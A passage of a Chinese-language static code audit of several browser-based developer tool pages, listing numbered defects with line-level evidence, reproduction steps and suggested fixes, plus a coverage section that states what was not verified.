- 影响：`tools/it/regex.html`（"复制分享链接"整个功能对含中文/换行的用例失效）
- 方案：改用 base64url（`btoa(...).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')`），读取时逆变换；或 `encodeURIComponent(btoa(...))` 再拼并 `decodeURIComponent` 取回；catch 里至少 `console.warn`。
**留存建议（tools/it/regex.html）**：一个编码函数就能修，注意别只改一半（写入/读取必须对称）。

### IT-N254 替换页无视用户 flags，恒补 `g`：与"匹配"页口径不一致、替换数恒为全量（中，确认缺陷）
- 问题：`doReplace()` 与 `copyMatches()` 都用 `flags.includes('g') ? flags : flags+'g'`，强制全局；而 `testRegex()` 严格按用户 flags（不勾 g 只取首个）。同一份 flags 下两页结论不同，"替换数"也永远等于全部匹配数。
- 证据：`tools/it/regex.html:599`（doReplace）、`:633`（copyMatches）、`:513-522`（testRegex 尊重 flags）。
- 复现：pattern=`\d`、flags 留空、文本 `a1b2` → 匹配页"共匹配 1 处"（只看首个），替换页"替换数: 2"、输出 `aXbX`；点"复制匹配"复制到 2 条。期望：三处都按 flags 走，或统一在 UI 标注"替换始终全局"。
- 影响：`tools/it/regex.html`
- 方案：替换改 `new RegExp(pattern, flags)`，不勾 g 时用 `String.prototype.replace` 的非全局语义（只替首个），并让 count 相应取首个；若刻意保留全局，则在替换页显式提示"忽略 g 设置，始终全量替换"。
**留存建议（tools/it/regex.html）**：与 N252 同批改，改函数签名即可。

### IT-N255 在线状态徽章被 `escapeHtml` 转义，页面直接显示 `<span class=…>` 源码（中，确认缺陷）
- 问题：`item()` 对传入 value 一律 `escapeHtml`，而 `:349`/`:369` 传的是 badge 的 HTML 串。
- 证据：`tools/it/device-info.html:301`（转义 `<`）、`:305`（`${escapeHtml(value)}`）、`:349`、`:369`；`:36-39` 的 `.status-badge` 样式因此永不生效。
- 复现：静态必然——`item('在线状态','<span class="status-badge ok">在线</span>')` 渲染为文本 `&lt;span class="status-badge ok"&gt;在线&lt;/span&gt;`，用户看到一行裸标签；期望是绿色"在线"徽章。
- 影响：`tools/it/device-info.html`（首屏最显眼的两处状态展示变成源码）
- 方案：`item()` 增加第 4 参 `raw`（true 时跳过转义，仅用于内部可信串），或把 badge 拼在 `item()` 之外；绝不对外部值放开转义。
**留存建议（tools/it/device-info.html）**：与 `:369` 一起改，两处同因。

### IT-N256 快照只记 5 个字段，且"趋势/对比"用的是恒定的 CPU 核数（中，确认缺陷）
- 问题：`__tbDevRec()` 只采 时间/`navigator.platform`/分辨率/语言/核心数 五项；图表与 diff 只读 `__v`（= `hardwareConcurrency`），同一台设备恒为常数 → 趋势是水平线、对比恒 `+0`，而真正会变的视口、DPR、在线状态、电池都没进快照。
- 证据：`tools/it/device-info.html:601-605`（`__tbDevRec`）、`:541`（`pts.push(d.__v)`）、`:546`（`chart.line` "趋势"）、`:551-553`（`diffLast(['__v'])`）。
- 复现：同一台机器连点 3 次"保存快照" → 三条记录 `__v` 完全相同：趋势图为直线，对比框显示"核心 0"；期望"对比"能反映实际变化（如视口尺寸、在线状态）。
- 影响：`tools/it/device-info.html`（"设备快照记录与对比"整体名不副实）
- 方案：`__v` 换成真正会变的标量（如视口面积 `innerWidth*innerHeight` 或 DPR），并把快照字段扩为 label/value 全量（可直接抓 `#screenInfo/#browserInfo/#localeInfo/#deviceStatus` 的条目文本）。
**留存建议（tools/it/device-info.html）**：先换 `__v`，一行即可让"趋势/对比"有意义。

### IT-N257 "复制全部信息"把 label、数值、条目全部粘连成一行（低，确认缺陷）
- 问题：直接 `join('\n')` 各容器的 `textContent`；而每个 `.info-item` 内 label 与 value 是相邻无空白的 `<div>`，条目之间也无空白 → 复制结果没有任何分隔。
- 证据：`tools/it/device-info.html:607-613`（`out.push(el.textContent.replace(/\s+/g,' ').trim())`）、`:305`（label/value 相邻 `<div>`，无空白文本节点）。
- 复现：静态推演复制结果首行 = `屏幕分辨率1920 × 1080视口大小1920 × 969设备像素比2.00…`（label 与数值、条目与条目全部粘连）；期望 `屏幕分辨率: 1920 × 1080` 每行一条。
- 影响：`tools/it/device-info.html`
- 方案：遍历 `.info-item` 取 `label + ': ' + value` 以 `\n` 连接；或直接 `JSON.stringify(__tbDevSnap())` 输出结构化文本。
**留存建议（tools/it/device-info.html）**：低优先，但"复制全部信息"是最常用的导出路径。

### IT-N258 中文/emoji 按 Latin-1 低字节写入二维码，扫码结果不是原文（高，确认缺陷）
- 问题：页面 `qrcode(0, level).addData(text)` 未指定编码，而本地库的 `stringToBytes` 默认实现是逐字符取 `charCodeAt & 0xFF`（单字节），页面从未切到 `stringToBytesFuncs['UTF-8']` → 中文字符被压成一个无关的 ASCII 低字节。
- 证据：`tools/it/qrcode.html:429-430`（`addData(text)`）、`js/qrcode.js:748`（`qrcode.stringToBytes = qrcode.stringToBytesFuncs['default']`）、`tools/it/qrcode.html:379-388`（`__qrBytes` 却按 UTF-8 计 3 字节）。
- 复现：node `require('./js/qrcode.js').stringToBytes('你好')` → `[96, 125]`（UTF-8 应为 `[228,189,160,229,165,189]`）；`stringToBytes('😀')` → `[61, 0]`（代理对被压成 1 个字节）。即"你好"实际写进码的是 `0x60 0x7D`，任何扫码器都读不出中文。同页 `__qrBytes('你好')=6` 与实际写入 2 字节也不一致。
- 影响：`tools/it/qrcode.html`（`vCard`/`WiFi` 等预设含中文，生成的码即错）
- 方案：`generate()` 内先 `qrcode.stringToBytes = qrcode.stringToBytesFuncs['UTF-8']`（或显式按 UTF-8 打包后 `addData`），并让 `__qrBytes` 与实际编码一致；代对（emoji）另加校验。
**留存建议（tools/it/qrcode.html）**：编码与容量估算两处必须同改，否则图与码继续互相打脸。

### IT-N259 h1/面包屑/JSON-LD/keywords/intro 都宣称"二维码识别/解析"，页面没有任何解码能力（高，确认缺陷）
- 问题：全站把本页当"生成 + 识别"工具（"上传二维码图片解析内容"），实际只引了生成库，无文件输入、无解码库、无 `decode` 函数。顺带 `<title>`（`:20` "二维码生成器"）与 h1（`:169` "二维码生成识别工具"）不一致，也是 SEO 缺陷。
- 证据：`tools/it/qrcode.html:11`（keywords 含"二维码识别,二维码解析,扫码解析"）、`:80-81`（JSON-LD name/description）、`:169`（h1）、`:182`（面包屑）、`:624`（intro 标题"生成与解析二维码"）、`:629`（intro"也可以上传二维码图片解析内容。。"，还多了一个句号）、`:347`（只引 `js/qrcode.js`）、`:5-165`（全量 script 列表无解码依赖）、全文无 `type="file"`。
- 复现：清点控件与依赖——无文件/相机/图片入口，无 jsQR 等解码库，`decode*` 函数 0 个 → 用户拿图片来只会扑空；期望按宣称提供"上传图片→解析文本"。
- 影响：`tools/it/qrcode.html`（误导性 SEO 宣称 + 用户预期落空）
- 方案：删掉"识别/解析"全部宣称（h1/面包屑/JSON-LD/keywords/intro 同步，并把 `<title>` 与 h1 统一），文件名与 URL 不动（`§7` 禁止改名）；若要做实，引入锁版本的本地解码库并加图片上传（仍在纯前端约束内）。
**留存建议（tools/it/qrcode.html）**：先按"删宣称"收口，成本最低且与实现一致。

### IT-N260 容量图只到第 10 版，超限后四根柱一律画 10，与"所需最小版本"标题矛盾（中，确认缺陷）
- 问题：`__qrChart()` 的容量表只有 v1-10；超限时 `if (v === 0) v = 10` 直接把 10 当结果，图标题却写"各纠错级别下编码当前内容所需最小版本"。
- 证据：`tools/it/qrcode.html:373-378`（`QR_BYTE_CAP` 仅 10 项）、`:403-404`（`v = 0 → 10`）、`:408-412`（标题）、`:559`（表注自己写"第 11-40 版容量继续增大"）。
- 复现：node+库——100 个"中"：`__qrBytes=300`，四个级别容量都不足 → 图上 L/M/Q/H 全为 10；而库实际编码 100 字节，`getModuleCount()=41`（v6）。300 个"中"：`__qrBytes=900`，图仍全 10，实际 `getModuleCount()=69`（v13）。
- 影响：`tools/it/qrcode.html`（长内容时"容量图示"给出的是错误结论）
- 方案：容量表补到 v40，或直接 `qrcode(0,lv).getModuleCount()` 反查真实版本；`v===0` 时标 "≥11" 而不是 10。
**留存建议（tools/it/qrcode.html）**：与 N258 同批，估算口径一起对齐。

### IT-N261 多行或"每字节 0x"的十六进制粘贴直接报非法，`^0x` 只去一次（中，确认缺陷）
- 问题：`dec()` 先 `replace(/^0x/i,'')`（只处理串首一个前缀）再剥分隔符，hexdump 形式（每行/每字节带 `0x`）残留的 `x` 触发"非法十六进制字符"。
- 证据：`tools/it/hex-encode.html:290`（`^0x` + `[\s:,;_-]` 剥离顺序）、`:291`（正则校验）、`:284`（编码侧 `prefix` 也只在整个串首加一个 `0x`）。
- 复现：node——`"0x48\n0x69 6f".replace(/^0x/i,'').replace(/[\s:,;_-]/g,'')` → `"480x696f"` → 命中 `:291` 报错；`"0x48 69"` → `"4869"`（仅首前缀可用）。期望两种写法都能解出 `Hi  o`。
- 影响：`tools/it/hex-encode.html`（开发者最常粘的 hexdump / 内存 dump 一律失败）
- 方案：先剥分隔符，再 `replace(/0x/gi,'')` 全局去前缀；编码侧勾选 `prefix` 时按字节加（`0x48 0x69`），与 C 数组/常见工具一致。
**留存建议（tools/it/hex-encode.html）**：两行调整，收益高。

### IT-N262 历史/数据表/图表与 CSV 恒空：textarea 结果读 `textContent`（中，确认缺陷）
- 问题：与 IT-N246 同型。`enc()` 写 `#output`（textarea）的 `.value`，`__hex_encodeResText()` 读 `.textContent` → 恒空 → `:393` 早退，记录/渲染/图表链全不触发；CSV 导的 `#hex_encodeTable` 也只在 Render 里填充。
- 证据：`tools/it/hex-encode.html:284`（写 `.value`）、`:335-342`（读 `textContent`）、`:392-393`（`if(!res) return`）、`:348-358`（Render 才填表）、`:414-416`（`exportTable('#hex_encodeTable')`）、`:157`（"导出明细 CSV"）。
- 复现：编码 `Hi` → `.value === "4869"`、`.textContent === ""`；不会走到 `TBKit.history.record(...)`，历史条目恒为 0，"数据表/图表/历史"三页签恒空，导出 CSV 无数据行。
- 影响：`tools/it/hex-encode.html`
- 方案：同 N246，`res` 取值改 `r.value || r.textContent` 并删掉 `/错误|Error/` 判空启发式。
**留存建议（tools/it/hex-encode.html）**：与 N246 一起改，避免两页再各修一遍。

### IT-N263 解码侧静默替换非法字节，且 `dec` 未接入历史（中，确认缺陷）
- 问题：`dec()` 用默认 `TextDecoder`（非 fatal）→ 非法 UTF-8 输出 `�` 无提示；历史包装只包了 `enc`（`:421-423`），点"解码 ↓"不会产生任何记录。
- 证据：`tools/it/hex-encode.html:295`、`:421-423`（`var __hex_encode_f0=(typeof enc==='function')?enc:null`）、`:392-393`。
- 复现：node `new TextDecoder().decode(new Uint8Array([0xFF]))` → `"�"`；页面输入 `FF` 点解码，输出框只显示一个替换符（用户会以为编码写错），且 history 不变。
- 影响：`tools/it/hex-encode.html`
- 方案：`TextDecoder('utf-8',{fatal:true})` + 失败提示并提供 Latin-1 对照；把 `dec` 也包进 `__hex_encodeExtras()`（方向记入记录键，如"模式=解码"）。
**留存建议（tools/it/hex-encode.html）**：与 N247 同一改法，顺手把 dec 补进历史。

### IT-N264 深度解析整块被塞进 `<textarea id="source">`：首屏输入框装 45 行 CSS/中文，深度解析永不渲染（高，确认缺陷）
- 问题：`<!-- TOOLBOX-DEEP-DIVE -->` 注入点落在 textarea 起始标签之后、`</textarea>` 之前。RCDATA 内除 `</textarea>` 外一律按文本处理，于是 `<style>…</style><section class="deep-dive">…</section>` 连同中间那个 `</body>` 全变成默认值文本；深度解析内容不渲染，示例 XML 也被撕成两半。
- 证据：`tools/it/xml-to-yaml.html:123`（`<textarea …><note>…<body>Don't forget me!<!-- TOOLBOX-DEEP-DIVE -->`）、`:124-155`（被吞的 style/section/`</section>`）、`:158`（`</body>&#10;  <items …>…</note></textarea>`）、`:419`（`resetForm()` 里才存着正确示例）。
- 复现：node 还原初值 → 长度 1909、45 行、含 `.deep-dive{` 与"深度解析"；`xmlToJson` 解出根 `note`，`dumpYaml` 得 55 行 YAML，开头即 `body:` 下挂 `style: ".deep-dive{max-width:960px…"`。即首屏"结果"页签展示的是把 CSS 当 XML 解析的垃圾，而非 `<note>` 转出的干净 YAML。
- 影响：`tools/it/xml-to-yaml.html`（首屏即坏；深度解析/FAQ 内容在页面上完全不存在）
- 方案：把 `:124-155` 与 `:158` 的 `</body>` 整段移出 textarea（插到 `:212-213`，即使用说明 `</ul>` 之后、容器 `</div>` 之前），恢复 `<note>…</note>` 为唯一初值；移动后必须重跑 `python3 _build.py`（构建对该区域只写一次，会一次性改写）。
**留存建议（tools/it/xml-to-yaml.html）**：本批最高优先，属"打开即废"；修完再逐条看 N265/N266。

### IT-N265 数组元素里套对象时输出 `[object Object]`（高，确认缺陷）
- 问题：`dumpYaml` 的数组分支只支持"标量元素或一层映射"，元素内的对象/数组仍交给 `yVal()`；`yVal` 对对象走 `String(v)` → `[object Object]`。
- 证据：`tools/it/xml-to-yaml.html:395-396`（数组分支 `out += (j===0?pad+'- ':pad+'  ')+kk+': '+yVal(it[kk])`）、`:380-385`（`yVal` 兜底 `return String(v)`）。
- 复现：`<a><b><c><d>1</d></c></b><b><e>2</e></b></a>` → JSON `{"a":{"b":[{"c":{"d":"1"}},{"e":"2"}]}}` → YAML `b:` 下两行 `- c: [object Object]` / `- e: "2"`。凡"列表里套对象"（K8s 清单、SOAP 列表、RSS）必中。
- 影响：`tools/it/xml-to-yaml.html`（真实配置迁移的主要场景直接不可用）
- 方案：数组元素递归 `dumpYaml(it, pad+'  ', sort, false)` 并做首行 `- ` 前缀处理（后续键缩进 2），或统一改走 JSON→YAML 的标准序列化。
**留存建议（tools/it/xml-to-yaml.html）**：与 N264 同批修，否则修好首屏也仍导错数据。

### IT-N266 属性两端都不合规：解析丢单引号属性/被 `>` 截断；输出 `@id`、`#text` 不是合法 YAML（中，确认缺陷）
- 问题：① 解析：属性正则只认 `="…"`，单引号属性静默丢弃；取标签头用 `indexOf('>')`，属性值里合法的 `>` 会提前截断。② 输出：`@`/`#text` 键连引号都不加。YAML 1.2 §5.1 中 `@` 是保留指示符、`#` 起始即注释，二者都不能作 plain scalar 开头 → 生成物在严格解析器里 `@id` 报错、`#text` 被当注释丢弃。
- 证据：`tools/it/xml-to-yaml.html:266-267`（`/([\w:-]+)\s*=\s*"([^"]*)"/g` 与 `while((m=re.exec(attrStr)))`）、`:258`（`indexOf('>',pos)`）、`:285`、`:289`（拼 `@` 与 `#text`）、`:402-406`（`out+=p+k+': '`，键从不加引号）、`:209` + `:109`（把这套约定写成推荐用法）。
- 复现：`<a b='v'>x</a>` → `{"a":"x"}`（属性丢失）；`<a b="x>y"><c>1</c></a>` → `{"a":{"c":"1","#text":"y\">"}}`（属性丢失且多出假文本）；`<items id="1">foo<item>a</item></items>` → 输出含 `@id: "1"`、`#text: foo` 两行，前者非法、后者等价注释。
- 影响：`tools/it/xml-to-yaml.html`（"属性/文本"这一核心映射规则产出不可解析的 YAML）
- 方案：属性正则补 `|='([^']*)'`；找 `>` 时跳过引号内字符；键统一过 `yKey()`（`@`/`#`/`:`/数字开头/YAML 保留字一律加双引号），并把 `#text` 改名（如 `text`）或加引号输出。
**留存建议（tools/it/xml-to-yaml.html）**：与 N264/N265 同批，改完用 `yaml` 解析器回读自检一次。

### IT-N267 只有单样本入口，却把所有键都写进 `required`（含 `null` 字段），与"多样本取交集"的说明矛盾（中，确认缺陷）
- 问题：`inferSchema` 对每个 key 无条件 `required.push(key)`；页面只能粘一个 JSON，不存在"所有样本"。公式清单却写"在所有样本中都出现的键才会被判定为必填"。
- 证据：`tools/it/json-schema-generator.html:429-441`（`:432` 无条件 push）、`:164`（说明）、`:206`（单个 textarea）、`:307-329`（SAMPLE 含 `metadata: null`）。
- 复现：用默认示例生成 → `required` 含 `metadata`，其 schema 为 `{type:"null",examples:[null]}`，等价于"该字段必填且只能为 null"；任何真实响应都会校验失败。期望：`null` 字段要么不进 required，要么标 `type:["null","string"]`。
- 影响：`tools/it/json-schema-generator.html`（生成的契约必然过度约束）
- 方案：支持多样本（顶层数组或多文档）取交集后再定 required，否则默认关闭该选项并删掉"多样本"文案；对 `null` 值输出 `type:["null", …]` 或直接跳过。
**留存建议（tools/it/json-schema-generator.html）**：本页最影响可用性的一条，先统一"单样本"口径再谈推断精度。

### IT-N268 "描述注释"勾选框是死控件，从不产出 `description`（中，确认缺陷）
- 问题：`optDescriptions` 的值读进 `options` 后没有任何消费点，`inferSchema` 全程不写 `description`。
- 证据：`tools/it/json-schema-generator.html:183`（控件）、`:572`（读取）、`:160`（公式说明自称"descriptions 生成说明"）、`:354-455`（推断无 `description`）、`:797`（预设"描述+极值+标题"还专门勾上它）。
- 复现：勾选与否各生成一次，`JSON.stringify(lastSchema)` 完全一致（diff 为空）；而预设 `:797` 声称会输出"描述"。
- 影响：`tools/it/json-schema-generator.html`（UI 承诺与输出不符，用户会以为功能坏了）
- 方案：实现 `description`（如 `prop.description = keyToTitle(key)` 或 `'The ' + key + ' field.'`），或删掉该复选框（成本最低）。
**留存建议（tools/it/json-schema-generator.html）**：删控件最省事，别留半截功能。

### IT-N269 混合类型数组直接退化成空 schema，没有任何 `anyOf/oneOf`（中，确认缺陷）
- 问题：`mergeSchemas` 在类型不一致时 `return {}`，于是 `items` 变成空 schema（"任意值均可"），元素类型信息全丢；同页 `:165` 却写"混合类型可用 anyOf/oneOf 表达"。
- 证据：`tools/it/json-schema-generator.html:461-481`（`:481` 返回 `{}`）、`:367-372`、`:165`。
- 复现：node 同逻辑 `mergeSchemas([{type:'integer'},{type:'string'}])` → `{}`；输入 `{"tags":[1,"a"]}` → `"tags":{"type":"array","items":{}}`，无法看出元素可为整数或字符串。期望 `items:{anyOf:[{type:"integer"},{type:"string"}]}` 或 `type:["integer","string"]`。
- 影响：`tools/it/json-schema-generator.html`
- 方案：返回 `{anyOf:[…去重同类…]}`（2020-12/draft-07 均支持），或 `{type:[...]}`；至少保留首个类型并加 `description:"mixed types in sample"` 作提示。
**留存建议（tools/it/json-schema-generator.html）**：与 N267 同批，属"推断结论丢失"。

### 承诺 vs 实际（R 批专项·8 页）
- `tools/it/qrcode.html:299`："最高版本 40 约存 2953 字节（数字模式）"——2953 是**字节模式**容量（数字模式为 7089 位），与同页 `:559` 的正确表注自相矛盾。
- `tools/it/qrcode.html:11`、`:80-81`、`:169`、`:629`：宣称"识别/解析上传图片"，实际只有生成（N259）；`:629` 还多打了一个句号"。。"。
- `tools/it/regex.html:345`、`:374`：建议用"原子组/独占量词"规避灾难性回溯——JS RegExp 两者都不支持（该建议只对 PCRE 有效），而本页正是 JS 正则测试器；且页面自述"应设超时保护"却未实现（N252）；`:654` 分享链接（N253）、`:599` 替换强制全局（N254）。
- `tools/it/xml-to-yaml.html:415-417` + `:404-405`：`indent` 选"2 空格"时首层实际 4 空格、二层 6 空格（root 传 `pad+'  '` 而 `pad` 已是 2 空格），与缩进控件承诺不符；`:209` 把 `@`/`#text` 当推荐约定（N266）；`:151` 的 FAQ 说"同名重复元素转成数组"，但单次出现时仍输出标量（`:288`、`:291-293`），形状随样本数变化。
- `tools/it/json-schema-generator.html:656-667`："验证"按钮只做 `JSON.stringify`（对普通对象不会失败），并未校验 Schema 合法性；`:500-501` `isIPv4` 不校验 0–255，`999.999.999.999`、`256.0.0.1`、`01.2.3.4` 都被标 `format:"ipv4"`（node 实测三条全 true）；`:464-476` 合并对象数组时重建 `{type,properties}`，丢掉 `required`。
- `tools/it/binary-to-text.html:203`：FAQ 关于空格/尾组的说明与实现相反（N248）；`:386` 导出的是从未填充的 `#binary_to_textTable`（N246）。
- `tools/it/hex-encode.html:284`：勾选前缀只在整串首加一个 `0x`（`0x4869`），与"每字节 0x"的常见约定不同（N261）；`:421-423` 只包 `enc`，解码不进历史（N263）。
- `tools/it/device-info.html:608-613`："复制全部信息"粘连无分隔（N257）；`:333-335` iPadOS 13+ 桌面模式 UA 只含 `Macintosh`/`Mac OS X` → 会判成 "macOS + 桌面设备"（待验证，本机无 iPad）；`:339-348` `isTouch` 取 `'ontouchstart' in window || maxTouchPoints>0`，两者可矛盾（显示"支持 (0 点)"，待验证）。
- `tools/it/regex.html` 历史只在点"常用正则"卡片时记录（`:814-816` 包装的 `applyPreset`，而 `:760` 的历史回放调 `applyPreset()` 无参 → 抛 TypeError 被吞），直接输入正则不记录；TBKit 预设条点击走 `preset.bar(n,list)` 的空参 `after`（`:812`、`js/tool-kit.js:1042-1053`）→ `applyPreset(undefined)` 抛 TypeError 被 try/catch 吞掉，toast 与历史都不生效（结果因 `setValue` 派发 `input` 事件仍会刷新）。
- 通用：本批 8 页的"导出明细 CSV"里，`binary-to-text`、`hex-encode` 两页导的是恒空的历史表（N246/N262）；`qrcode`、`device-info`、`chinese-name-generator` 的导出只在真正产生记录后才有效，无记录时无任何提示。
- 通用（隐私口径）：`device-info` 页声称"所有数据仅在浏览器本地显示，不会上传"，源码中确无 `fetch/sendBeacon`（`js/analytics.js`、`js/metrics.js` 亦无网络调用），但模板 `:73` 左右统一注入第三方 `lf1-cdn-tos.bytegoofy.com` push.js（拿到完整 DOM 权限）——"不上传"应限定为"表单数据不上传"，或移除该第三方脚本。

### 覆盖
- 实读 8 页：`tools/it/binary-to-text.html`、`tools/it/chinese-name-generator.html`、`tools/it/regex.html`、`tools/it/device-info.html`、`tools/it/qrcode.html`、`tools/it/hex-encode.html`、`tools/it/xml-to-yaml.html`、`tools/it/json-schema-generator.html`（另读了 `js/qrcode.js`、`js/common.js`、`js/tool-kit.js` 的相关片段）。
- 新增 24 条（高 5 / 中 15 / 低 4），编号 IT-N246~IT-N269；本批无重号（上一批止于 IT-N245）。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条穷举 8 页全部输入域（binary/hex 只测分隔符、长度、非法 UTF-8/BOM 与 `0x` 前缀；regex 只测 ReDoS 计时、分享链接往返、强制 g 与 1000 条上限，未逐条验证所有 flag 组合与 `u`/`v` 语义；qrcode 只验证编码字节、容量估算与导出参数，未实际扫码；xml 用页面自身函数跑 6 组用例，未覆盖命名空间/CDATA 嵌套；schema 只验证 required/anyOf/描述/ipv4/验证按钮）。姓名池统计已全量（两池各 100 项），但未统计真实重名率（跨批不查重）。
- 未做验证：未开浏览器、未构建、未跑门禁、未 git 写；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/audit_xml.js`、`/tmp/audit_name.js`，未落仓库）；未验证英文态 `?lang=en-US`、繁体与移动端；`IT-N251`（toast 文案）与 `device-info` 的 iPad/触摸两项标为待验证。

### IT-N270 Node 模板缺 `.env`，与"机密文件务必忽略"及示例输出相反（高，确认缺陷）
- 问题：页面三处承诺会输出 `.env` 规则（注意事项"机密文件（.env）务必忽略"、深度解析"选 Node → 输出 `node_modules/`、`dist/`、`.env` 等规则"），但 8 个模板共 29 条规则里没有任何 `.env`（只有 `env/` 目录，与 `.env` 文件完全不同）。
- 证据：`tools/it/gitignore-generator.html:219`（Node 模板 5 条，无 `.env`）、`:172`（务必忽略 `.env`）、`:382`（示例声称输出 `.env`）、`:217-226`（全量模板表）。
- 复现：node 汇总 `T` 全部 items → 29 条，`includes('.env')`、`.env.*`、`.DS_Store`、`*.log`、`coverage/` 全为 false；只勾 Node 时实际输出 `node_modules/`、`npm-debug.log*`、`yarn-error.log`、`dist/`、`.next/` 五行，无 `.env`。
- 影响：用户按页面提示以为密钥已被忽略，实际 `.env` 仍会入库；这是安全承诺落空，比多一条规则严重得多。
- 方案：Node/Python/Go 等模板统一追加 `.env`、`.env.*`、`!.env.example`（保留样例），或新增"通用/机密"模板；同时按实际输出改写 `:382` 示例，避免再写未生成的规则。
**留存建议（tools/it/gitignore-generator.html）**：最小修复是在 `T.node.items` 补 `.env` 与 `!.env.example`，并纠示例文案。

### IT-N271 "默认参数"预设把 8 个技术栈全勾上，且预设不清除旧勾选（中，确认缺陷）
- 问题：预设"默认参数"给 8 个 checkbox 全传真值；而页面真实默认只勾 Node。`setValue` 对 checkbox 执行 `f.checked = !!val`，传 `'py'/'node'/…` 均为 true。且预设只设置所列字段，不重置未列出的项，切换预设会叠加而非替换。
- 证据：`tools/it/gitignore-generator.html:344`（values 覆盖 `top_py`~`top_ide`）、`:127`（仅 `top_node` 带 `checked`）、`js/tool-kit.js:993`（`checked = !!val`）、`:235-243`（resetForm 才是全不选）。
- 复现：点"默认参数"→ 8 项全选中，输出 8 段规则；先点"默认参数"再点"Python+Node"→ 仍是 8 项全选（未列出的项保持原状）；期望"默认参数"只勾 Node、"Python+Node"只勾这两项。
- 影响：每次都要手动取消 7 项，极易生成与项目无关的大段规则；"默认参数"名不副实。
- 方案：`preset.bar` 层支持 `values` 全量赋值（未列出的 checkbox 显式置 false），或将"默认参数"改名为"全栈模板"并另加一个真正只勾 Node 的默认项。
**留存建议（tools/it/gitignore-generator.html）**：与 `js/tool-kit.js` 的 preset 语义一起改，别只改本页。

### IT-N272 历史/数据表/图表都取截断后的纯文本，图表恒空（中，确认缺陷）
- 问题：`ResText` 读 `#result` 的 `textContent` 并 `slice(0,80)`，得到 `.gitignore # Generated…` 这类非数值串；图表用 `parseFloat` 解析该串，恒为 `NaN`，`nums.length>=2` 永不成立，趋势图从不渲染；历史/数据表也只能看到前 80 字符（规则尾部被截断）。
- 证据：`tools/it/gitignore-generator.html:259-265`（ResText 截 80 字）、`:134`（结果容器）、`:299-306`（`parseFloat(arr[j].d[rk])` + `nums.length>=2` 才画图）。
- 复现：连续计算 Node、Python 两次 → 数据表两行，结果列均为 `.gitignore # Generated by ToolBox .gitignore Generator # Node.js node_modules/…` 前 80 字；图表区域始终空白，期望按选中栈数量或规则条数出趋势。
- 影响：三个辅助 tab（图表/数据表/历史）实际不可用，无法对比两套配置差异。
- 方案：历史摘要改存结构化数字（如 `{stacks: sel.length, rules: lines.length}`），或至少把 `resText` 改为读取规则条数；图表用该数值字段。
**留存建议（tools/it/gitignore-generator.html）**：历史字段别存整段文本，存 `stacks/rules` 两个计数即可。

### IT-N273 所谓"二维码"是随机噪点图，扫码器必然读不出（高，确认缺陷）
- 问题：`renderQR` 只画 3 个定位图形与一条时序线，其余 25×25 单元用 `pseudoRandom(strHash(text))` 随机 0/1 填充；没有格式信息、版本信息、数据编码、掩码与 RS 纠错码，也没有静区。它不是二维码，只是"像二维码的图案"。
- 证据：`tools/it/phone-qr.html:250-269`（`grid[r][c]=rnd()<0.5?0:1`）、`:271-277`（画布）、`:261`（仅画定位/时序）。
- 复现：输入 `13800138000` → 生成 25×25 固定噪点；同一号码两次结果一致（种子=哈希），但没有任何可解码数据区；按构造（无数据码字/纠错块）任何 QR 解码器都不可能返回 `tel:…`（未实扫，仅静态判定）。
- 影响：工具唯一核心功能不成立；页面却称"扫码唤起拨号""主流扫码器均支持"，属功能造假。
- 方案：内联/本地引入二维码编码实现（如 `qrcode` 的 QR 编码核心），按 byte 模式写入 `tel:` 载荷并补 4 模块静区；在真机上用扫码器回归一次后再上线。
**留存建议（tools/it/phone-qr.html）**：这是本页根问题，先修真 QR，再谈样式。

### IT-N274 已带 `tel:` 的输入不剥离空白，与公式声明不符（中，确认缺陷）
- 问题：公式写"去首尾空白后剥离全部空白字符"，实现只在"不以 tel: 开头"分支执行 `replace(/\s+/g,'')`；已带前缀时空白原样进入载荷与画布。
- 证据：`tools/it/phone-qr.html:158`（公式）、`:281`（`if(!/^tel:/i.test(phone)) phone='tel:'+phone.replace(/\s+/g,'')`）。
- 复现：输入 `tel:+86 138 0013 8000` → 实际载荷 `tel:+86 138 0013 8000`；期望 `tel:+8613800138000`（RFC 3966 的 visual-separator 不允许裸空格）。
- 影响：扫码/拨号端可能把空格当非法字符；同一号码因写法不同生成不同图。
- 方案：先 `phone = phone.replace(/\s+/g,'')`，再判断并补 `tel:`；同时校验只允许 `+`、数字、（可选）`;` 参数。
**留存建议（tools/it/phone-qr.html）**：顺手把 `^tel:` 判断移到清洗之后，一行顺序问题。

### IT-N275 只能复制文本、无 PNG 下载，且图案没有静区（中，确认缺陷）
- 问题：结果区只有 canvas 与"复制"按钮，复制的是 `#output` 的 `textContent`（即 `tel:` 文本），不是图片；没有 `toDataURL` 下载入口。finder 从 `i=-1` 开始但越界直接跳过，未留 4 模块静区。
- 证据：`tools/it/phone-qr.html:167`（唯一按钮"复制"）、`:288-290`（复制 textContent）、`:252-261`（无静区）、`:271-277`（canvas 未导出）。
- 复现：生成后点"复制"→ 粘贴得到 `tel:13800138000`；右键无"图片另存"菜单项，移动端只能截屏；期望得到可保存的 PNG。
- 影响：二维码无法用于名片/海报/打印；即使换成真 QR，缺静区也会降低识别率。
- 方案：加"下载 PNG"按钮（`canvas.toDataURL('image/png')`），画布四周留 4 模块白边。
**留存建议（tools/it/phone-qr.html）**：下载按钮是本页第二刚需，与真 QR 一起补。

### IT-N276 `map<...>` 字段直接把整份 .proto 解析打断（高，确认缺陷）
- 问题：`parseField` 把 `map` 当普通类型，随后把 `<` 当字段名、把 `string` 当"期望 ;"的位置，抛错终止整文件；`oneof` 内的 map 同样不支持。proto3/gRPC 里 map 极常见。
- 证据：`tools/it/protobuf-parser.html:287-306`（`:290` 取 type、`:292` 取 name、`:305` `expect(';')`）、`:308-323`（oneof 同样无 map 分支）。
- 复现：输入 `message M { map<string, Address> tags = 1; }` → 实际 `❌ 期望 ;`，输出为空；期望 `{type:'map', keyType:'string', valueType:'Address', name:'tags', number:1}`。
- 影响：含 map 的 .proto（业务消息几乎必有）整体解析失败，工具不可用。
- 方案：`parseField` 先判 `map`，消费 `<`、keyType、`,`、valueType、`>`，再读字段名/编号；同时补 `extensions`/`extend` 分支。
**留存建议（tools/it/protobuf-parser.html）**：优先修 map，这是覆盖面最大的解析缺口。

### IT-N277 "校验"只数括号，任意非法文本都报"语法正确"（高，确认缺陷）
- 问题：`doValidate` 仅对 token 做 `{}[]()` 深度计数，完全不调用解析器；`message X { int a }`、`hello world`、甚至空文件都会通过。
